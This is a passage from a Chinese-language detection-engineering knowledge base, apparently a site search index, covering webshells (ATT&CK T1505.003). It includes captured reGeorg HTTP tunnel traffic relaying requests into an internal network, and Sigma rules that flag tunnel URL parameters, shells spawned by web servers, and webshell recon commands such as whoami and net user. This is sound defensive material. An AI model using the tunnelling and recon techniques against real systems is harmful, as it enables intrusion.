OK\nContent-Type: text/html\nTransfer-Encoding: chunked\nDate: Thu, 17 Dec 2020 16:44:45 GMT\n</code></pre> <p>\u63a5\u4e0b\u6765\u8fd9\u6761\u6d41\u5c31\u662fcmd=forward\uff0c\u8f6c\u53d1\u5230\u5185\u7f51</p> <pre><code>POST /tunnel.jsp?cmd=forward HTTP/1.1\nHost: 182.92.73.106:8080\nAccept-Encoding: identity\nContent-Length: 83\nContent-Type: application/octet-stream\nX-CMD: FORWARD\nCookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly\nConnection: Keep-Alive\nUser-Agent: python-urllib3/1.26.2\nGET /login.php HTTP/1.1\nHost: 172.17.0.2\nUser-Agent: curl/7.68.0\nAccept: */*\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nX-STATUS: OK\nContent-Type: text/html\nContent-Length: 0\nDate: Thu, 17 Dec 2020 16:44:45 GMT\n</code></pre> <p>\u6700\u540e\u5c31\u662fcmd=disconnect\u5173\u95ed\u8fde\u63a5</p> <pre><code>POST /tunnel.jsp?cmd=disconnect HTTP/1.1\nHost: 182.x.x.x:8080\nAccept-Encoding: identity\nX-CMD: DISCONNECT\nCookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly\nUser-Agent: python-urllib3/1.26.2\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nX-STATUS: OK\nContent-Type: text/html\nContent-Length: 0\nDate: Thu, 17 Dec 2020 16:44:45 GMT\n</code></pre> <p>\u5185\u7f51\u670d\u52a1\u5668</p> <p>\u5728\u5185\u7f51\u670d\u52a1\u5668\u4e0a\u6293\u5305,\u770b\u5230\u670d\u52a1\u5668A\u5411\u5185\u7f51\u8bf7\u6c42\u4e86login.php</p> <pre><code>GET /login.php HTTP/1.1\nHost: 172.17.0.2\nUser-Agent: curl/7.68.0\nAccept: */*\nHTTP/1.1 200 OK\nDate: Thu, 17 Dec 2020 16:53:17 GMT\nServer: Apache/2.4.7 (Ubuntu)\nX-Powered-By: PHP/5.5.9-1ubuntu4.25\nSet-Cookie: PHPSESSID=65ehap87lgj2sk84poopt0aep3; path=/\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\nCache-Control: no-cache, must-revalidate\nPragma: no-cache\nSet-Cookie: PHPSESSID=65ehap87lgj2sk84poopt0aep3; path=/; httponly\nSet-Cookie: security=impossible; httponly\nVary: Accept-Encoding\nContent-Length: 1567\nContent-Type: text/html;charset=utf-8\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;\n</code></pre> <p>\u4ee5\u4e0a\u5185\u5bb9\u6458\u81eahttps://cloud.tencent.com/developer/article/1779195</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Webshell ReGeorg HTTP\u96a7\u9053\u68c0\u6d4b\nstatus: \u6d4b\u8bd5\u72b6\u6001\ndescription: \u901a\u8fc7\u8bf7\u6c42\u8def\u5f84\u5185\u7684\u5185\u5bb9\u8fdb\u884c\u68c0\u6d4b\uff0c\u57fa\u4e8eurl\u53c2\u6570\u68c0\u6d4b\nreferences:\n    - https://cloud.tencent.com/developer/article/1779195\n    - https://github.com/sensepost/reGeorg\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        uri_query|contains: #url\u4e2d\u5305\u542b\u6b64\u7c7b\u7279\u5f81\n            - '*cmd=read*'\n            - '*connect&amp;target*'\n            - '*cmd=connect*'\n            - '*cmd=disconnect*'\n            - '*cmd=forward*'\n    filter:\n        referer: null\n        useragent: null\n        method: POST\n    condition: selection and filter\nfields:\n    - uri_query\n    - referer\n    - method\n    - useragent\nfalsepositives:\n    - web applications that use the same URL parameters as ReGeorg\nlevel: high\ntags:\n    - attack.persistence\n    - attack.t1100\n    - attack.t1505.003\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_6","title":"\u5907\u6ce8","text":"<p>\u591a\u6570\u5b89\u5168\u8bbe\u5907\u5df2\u652f\u6301\u68c0\u6d4b\u6b64\u7c7b\u96a7\u9053\u884c\u4e3a\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1505-003</p> <p>https://attack.mitre.org/techniques/T1505/003/</p> <p>reGeorg\u642d\u5efaHTTP\u96a7\u9053\u548c\u6d41\u91cf\u5206\u6790</p> <p>https://cloud.tencent.com/developer/article/1779195</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/","title":"T1505-003-web\u670d\u52a1\u4ea7\u751f\u7684\u53ef\u7591\u8fdb\u7a0b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002</p> <p>\u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49)</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6b64\u68c0\u6d4b\u65b9\u6cd5\u5c06\u67e5\u627e\u5e38\u89c1\u7684Web\u670d\u52a1\u5668\u8fdb\u7a0b\u540d\u79f0\uff0c\u5e76\u6807\u8bc6\u4f7f\u7528\u811a\u672c\u8bed\u8a00\uff08cmd\uff0cpowershell\uff0cwscript\uff0ccscript\uff09\uff0c\u8bf7\u6ce8\u610f\u5e38\u89c1\u7684\u521d\u59cb\u914d\u7f6e\u6587\u4ef6\u547d\u4ee4\uff08net\\net1\\whoami\\ping\\ipconfig\uff09\u6216\u7ba1\u7406\u547d\u4ee4\uff08sc\uff09\u542f\u52a8\u7684\u4efb\u4f55\u8fdb\u7a0b\u3002\u770b\u5230\u6b64\u6d3b\u52a8\u5e76\u4e0d\u610f\u5473\u7740\u60a8\u7684\u670d\u52a1\u5668\u7acb\u5373\u5b58\u5728\u53ef\u7591\u884c\u4e3a\uff0c\u56e0\u6b64\u60a8\u9700\u8981\u81ea\u5df1\u8c03\u6574\u68c0\u6d4b\u8bed\u53e5\uff0c\u4ee5\u4fbf\u8be5\u68c0\u6d4b\u65b9\u6cd5\u9002\u5e94\u60a8\u7684web\u5e94\u7528\u73af\u5883\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u3001sysmon\u65e5\u5fd7\u3001\u4ee5\u53ca\u5176\u4ed6\u53ef\u8bb0\u5f55\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7684EDR\u4ea7\u54c1</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>- &lt;Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"&gt;\n- &lt;System&gt;\n &lt;Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /&gt; \n &lt;EventID&gt;4688&lt;/EventID&gt; \n &lt;Version&gt;2&lt;/Version&gt; \n &lt;Level&gt;0&lt;/Level&gt; \n &lt;Task&gt;13312&lt;/Task&gt; \n &lt;Opcode&gt;0&lt;/Opcode&gt; \n &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; \n &lt;TimeCreated SystemTime=\"2015-11-12T02:24:52.377352500Z\" /&gt; \n &lt;EventRecordID&gt;2814&lt;/EventRecordID&gt; \n &lt;Correlation /&gt; \n &lt;Execution ProcessID=\"4\" ThreadID=\"400\" /&gt; \n &lt;Channel&gt;Security&lt;/Channel&gt; \n &lt;Computer&gt;WIN-GG82ULGC9GO.contoso.local&lt;/Computer&gt; \n &lt;Security /&gt; \n &lt;/System&gt;\n- &lt;EventData&gt;\n &lt;Data Name=\"SubjectUserSid\"&gt;S-1-5-18&lt;/Data&gt; \n &lt;Data Name=\"SubjectUserName\"&gt;WIN-GG82ULGC9GO$&lt;/Data&gt; \n &lt;Data Name=\"SubjectDomainName\"&gt;CONTOSO&lt;/Data&gt; \n &lt;Data Name=\"SubjectLogonId\"&gt;0x3e7&lt;/Data&gt; \n &lt;Data Name=\"NewProcessId\"&gt;0x2bc&lt;/Data&gt; \n &lt;Data Name=\"NewProcessName\"&gt;C:\\\\Windows\\\\System32\\\\rundll32.exe&lt;/Data&gt; \n &lt;Data Name=\"TokenElevationType\"&gt;%%1938&lt;/Data&gt; \n &lt;Data Name=\"ProcessId\"&gt;0xe74&lt;/Data&gt; \n &lt;Data Name=\"CommandLine\" /&gt; \n &lt;Data Name=\"TargetUserSid\"&gt;S-1-5-21-1377283216-344919071-3415362939-1104&lt;/Data&gt; \n &lt;Data Name=\"TargetUserName\"&gt;dadmin&lt;/Data&gt; \n &lt;Data Name=\"TargetDomainName\"&gt;CONTOSO&lt;/Data&gt; \n &lt;Data Name=\"TargetLogonId\"&gt;0x4a5af0&lt;/Data&gt; \n &lt;Data Name=\"ParentProcessName\"&gt;C:\\\\Windows\\\\explorer.exe&lt;/Data&gt; \n &lt;Data Name=\"MandatoryLabel\"&gt;S-1-16-8192&lt;/Data&gt; \n &lt;/EventData&gt;\n&lt;/Event&gt;\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: web\u670d\u52a1\u4ea7\u751f\u7684\u53ef\u7591\u8fdb\u7a0b\nstatus: experimental #\u6d4b\u8bd5\u72b6\u6001\ndescription: Web\u670d\u52a1\u5668\u4ea7\u751f\u7684\u53ef\u7591\u7684shell\u8fdb\u7a0b\uff0c\u53ef\u80fd\u662f\u6210\u529f\u653e\u7f6eWeb shell\u6216\u5176\u4ed6\u653b\u51fb\u7684\u7ed3\u679c\nlogsource:\n    category: process_creation #\u8fdb\u7a0b\u521b\u5efa\n    product: windows #\u6570\u636e\u6e90\uff0cwindows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\w3wp.exe'\n            - '*\\httpd.exe'\n            - '*\\nginx.exe'\n            - '*\\php-cgi.exe'\n            - '*\\tomcat.exe'\n            - '*\\sqlservr.exe'\n        Image:\n            - '*\\cmd.exe'\n            - '*\\sh.exe'\n            - '*\\bash.exe'\n            - '*\\powershell.exe'\n            - '*\\bitsadmin.exe'\n            - '*\\cscript.exe'\n            - '*\\wscript.exe'\n            - '*\\net.exe'\n            - '*\\net1.exe'\n            - '*\\ping.exe'\n            - '*\\whoami.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.persistence\n    - attack.t1505.003\n    - attack.privilege_escalation       # an old one\n    - attack.t1190\nfalsepositives:\n    - \u7279\u5b9a\u7684web\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5408\u6cd5\u5730\u6d3e\u751fshell\u8fdb\u7a0b\uff0c\u5982ipconfig\u3001whoami\u7b49\u8fdb\u7a0b\uff0c\u5728\u90e8\u5206\u5ba2\u6237\u4fa7\uff0c\u53d1\u73b0\u6b64\u4e24\u8fdb\u7a0b\u9891\u7e41\u88ab\u8c03\u7528\uff0c\u5176\u4e3b\u673a\u5e76\u65e0\u5f02\u5e38\u3002\nlevel: high\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_6","title":"\u5907\u6ce8","text":"<p>\u6574\u4f53\u68c0\u6d4b\u601d\u8def\uff0c\u653b\u51fb\u8005\u901a\u8fc7webshell\u6267\u884c\u4e00\u4e9b\u4fe1\u606f\u6536\u96c6\u7684\u547d\u4ee4\uff0c\u5982ipconfig\u7b49\u547d\u4ee4\u3002\u6b64\u7c7b\u884c\u4e3a\u5728windows\u65e5\u5fd7\u4e0a\u7684\u8868\u73b0\u5f62\u5f0f\u4e3a\uff0c\u7528\u6237\u8c03\u7528\u4e86\u5e38\u89c1\u7684\u4e2d\u95f4\u4ef6\u7684\u8fdb\u7a0b\uff0c\u6267\u884c\u4e86\u67d0\u4e9b\u547d\u4ee4\u3002\u6b64\u89c4\u5219\u68c0\u6d4b\u601d\u8def\u4fbf\u662f\u6765\u6e90\u4e8e\u6b64\uff0c\u4ec5\u4ec5\u9002\u7528\u4e8ewindows\u5e73\u53f0\uff0c\u53ef\u81ea\u884c\u6dfb\u52a0\u5e38\u89c1\u7684\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u6216\u8005\u5176\u4ed6\u76ee\u7684\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4e0d\u65ad\u5b8c\u5584\u89c4\u5219\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1505-003</p> <p>https://attack.mitre.org/techniques/T1505/003/</p> <p>Web\u670d\u52a1\u5668\u6267\u884c\u53ef\u7591\u5e94\u7528\u7a0b\u5e8f</p> <p>https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/Webserver%20Executing%20Suspicious%20Applications.md</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/","title":"T1505-003-windows\u4e0bwebshell\u68c0\u6d4b","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002</p> <p>\u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49)</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#regeorg","title":"ReGeorg\u7b80\u4ecb","text":"<p>webshell\u5c31\u662f\u4ee5asp\u3001php\u3001jsp\u6216\u8005cgi\u7b49\u7f51\u9875\u6587\u4ef6\u5f62\u5f0f\u5b58\u5728\u7684\u4e00\u79cd\u4ee3\u7801\u6267\u884c\u73af\u5883\uff0c\u4e5f\u53ef\u4ee5\u5c06\u5176\u79f0\u505a\u4e3a\u4e00\u79cd\u7f51\u9875\u540e\u95e8\u3002\u9ed1\u5ba2\u5728\u5165\u4fb5\u4e86\u4e00\u4e2a\u7f51\u7ad9\u540e\uff0c\u901a\u5e38\u4f1a\u5c06asp\u6216php\u540e\u95e8\u6587\u4ef6\u4e0e\u7f51\u7ad9\u670d\u52a1\u5668WEB\u76ee\u5f55\u4e0b\u6b63\u5e38\u7684\u7f51\u9875\u6587\u4ef6\u6df7\u5728\u4e00\u8d77\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528\u6d4f\u89c8\u5668\u6765\u8bbf\u95eeasp\u6216\u8005php\u540e\u95e8\uff0c\u5f97\u5230\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u73af\u5883\uff0c\u4ee5\u8fbe\u5230\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u76ee\u7684\u3002</p> <p>\u987e\u540d\u601d\u4e49\uff0c\u201cweb\u201d\u7684\u542b\u4e49\u662f\u663e\u7136\u9700\u8981\u670d\u52a1\u5668\u5f00\u653eweb\u670d\u52a1\uff0c\u201cshell\u201d\u7684\u542b\u4e49\u662f\u53d6\u5f97\u5bf9\u670d\u52a1\u5668\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u64cd\u4f5c\u6743\u9650\u3002webshell\u5e38\u5e38\u88ab\u79f0\u4e3a\u5165\u4fb5\u8005\u901a\u8fc7\u7f51\u7ad9\u7aef\u53e3\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u64cd\u4f5c\u7684\u6743\u9650\u3002\u7531\u4e8ewebshell\u5176\u5927\u591a\u662f\u4ee5\u52a8\u6001\u811a\u672c\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u4e5f\u6709\u4eba\u79f0\u4e4b\u4e3a\u7f51\u7ad9\u7684\u540e\u95e8\u5de5\u5177\u3002</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows\u3001sysmon\u65e5\u5fd7\u3001\u4ee5\u53ca\u5176\u4ed6\u53ef\u8bb0\u5f55\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7684EDR\u4ea7\u54c1</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0</p>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>- &lt;Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"&gt;\n- &lt;System&gt;\n &lt;Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /&gt; \n &lt;EventID&gt;4688&lt;/EventID&gt; \n &lt;Version&gt;2&lt;/Version&gt; \n &lt;Level&gt;0&lt;/Level&gt; \n &lt;Task&gt;13312&lt;/Task&gt; \n &lt;Opcode&gt;0&lt;/Opcode&gt; \n &lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt; \n &lt;TimeCreated SystemTime=\"2015-11-12T02:24:52.377352500Z\" /&gt; \n &lt;EventRecordID&gt;2814&lt;/EventRecordID&gt; \n &lt;Correlation /&gt; \n &lt;Execution ProcessID=\"4\" ThreadID=\"400\" /&gt; \n &lt;Channel&gt;Security&lt;/Channel&gt; \n &lt;Computer&gt;WIN-GG82ULGC9GO.contoso.local&lt;/Computer&gt; \n &lt;Security /&gt; \n &lt;/System&gt;\n- &lt;EventData&gt;\n &lt;Data Name=\"SubjectUserSid\"&gt;S-1-5-18&lt;/Data&gt; \n &lt;Data Name=\"SubjectUserName\"&gt;WIN-GG82ULGC9GO$&lt;/Data&gt; \n &lt;Data Name=\"SubjectDomainName\"&gt;CONTOSO&lt;/Data&gt; \n &lt;Data Name=\"SubjectLogonId\"&gt;0x3e7&lt;/Data&gt; \n &lt;Data Name=\"NewProcessId\"&gt;0x2bc&lt;/Data&gt; \n &lt;Data Name=\"NewProcessName\"&gt;C:\\\\Windows\\\\System32\\\\rundll32.exe&lt;/Data&gt; \n &lt;Data Name=\"TokenElevationType\"&gt;%%1938&lt;/Data&gt; \n &lt;Data Name=\"ProcessId\"&gt;0xe74&lt;/Data&gt; \n &lt;Data Name=\"CommandLine\" /&gt; \n &lt;Data Name=\"TargetUserSid\"&gt;S-1-5-21-1377283216-344919071-3415362939-1104&lt;/Data&gt; \n &lt;Data Name=\"TargetUserName\"&gt;dadmin&lt;/Data&gt; \n &lt;Data Name=\"TargetDomainName\"&gt;CONTOSO&lt;/Data&gt; \n &lt;Data Name=\"TargetLogonId\"&gt;0x4a5af0&lt;/Data&gt; \n &lt;Data Name=\"ParentProcessName\"&gt;C:\\\\Windows\\\\explorer.exe&lt;/Data&gt; \n &lt;Data Name=\"MandatoryLabel\"&gt;S-1-16-8192&lt;/Data&gt; \n &lt;/EventData&gt;\n&lt;/Event&gt;\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u901a\u8fc7\u5e38\u89c1\u7684\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4bwebshell\u884c\u4e3a\ndescription: \u901a\u8fc7web shell\u4fa6\u5bdf\u6d3b\u52a8\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u67d0\u4e9b\u547d\u4ee4\u884c\u53c2\u6570\u6765\u68c0\u6d4b\u8fb9\u754cweb\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728webshell\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html\n    - https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/\ntags:\n    - attack.persistence\n    - attack.t1505.003\n    - attack.t1018\n    - attack.t1033\n    - attack.t1087\n    - attack.privilege_escalation       # an old one\n    - attack.t1100      # an old one\nlogsource:\n    category: process_creation #\u8fdb\u7a0b\u521b\u5efa\n    product: windows #windows\u6570\u636e\u6e90\ndetection:\n    selection:\n        ParentImage:\n            - '*\\apache*'\n            - '*\\tomcat*'\n            - '*\\w3wp.exe'\n            - '*\\php-cgi.exe'\n            - '*\\nginx.exe'\n            - '*\\httpd.exe'\n        CommandLine:\n            - '*whoami*'\n            - '*net user *'\n            - '*net use *'\n            - '*net group *'\n            - '*quser*'\n            - '*ping -n *'\n            - '*systeminfo'\n            - '*&amp;cd&amp;echo*'\n            - '*cd /d*'  # https://www.computerhope.com/cdhlp.htm\n            - '*ipconfig*' \n            - '*pathping*' \n            - '*tracert*' \n            - '*netstat*' \n            - '*schtasks*' \n            - '*vssadmin*' \n            - '*wevtutil*' \n            - '*tasklist*' \n            - '*wmic /node:*' \n            - '*Test-NetConnection*' \n            - '*dir \\*'  # remote dir: dir \\&lt;redacted IP #3&gt;\\C$:\\windows\\temp\\*.exe\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown #\u6709\u6548\u6027\uff0c\u672a\u77e5\nlevel: high #\u7b49\u7ea7\u8f83\u9ad8\n</code></pre>"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_6","title":"\u5907\u6ce8","text":"<p>\u6574\u4f53\u68c0\u6d4b\u601d\u8def\uff0c\u653b\u51fb\u8005\u901a\u8fc7webshell\u6267\u884c\u4e00\u4e9b\u4fe1\u606f\u6536\u96c6\u7684\u547d\u4ee4\uff0c\u5982ipconfig\u7b49\u547d\u4ee4\u3002\u6b64\u7c7b\u884c\u4e3a\u5728windows\u65e5\u5fd7\u4e0a\u7684\u8868\u73b0\u5f62\u5f0f\u4e3a\uff0c\u7528\u6237\u8c03\u7528\u4e86\u5e38\u89c1\u7684\u4e2d\u95f4\u4ef6\u7684\u8fdb\u7a0b\uff0c\u6267\u884c\u4e86\u67d0\u4e9b\u547d\u4ee4\u3002\u6b64\u89c4\u5219\u68c0\u6d4b\u601d\u8def\u4fbf\u662f\u6765\u6e90\u4e8e\u6b64\uff0c\u4ec5\u4ec5\u9002\u7528\u4e8ewindows\u5e73\u53f0\uff0c\u53ef\u81ea\u884c\u6dfb\u52a0\u5e38\u89c1\u7684\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u6216\u8005\u5176\u4ed6\u76ee\u7684\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4e0d\u65ad\u5b8c\u5584\u89c4\u5219\u3002</p>"},{"location":"0x3_%E5%88%9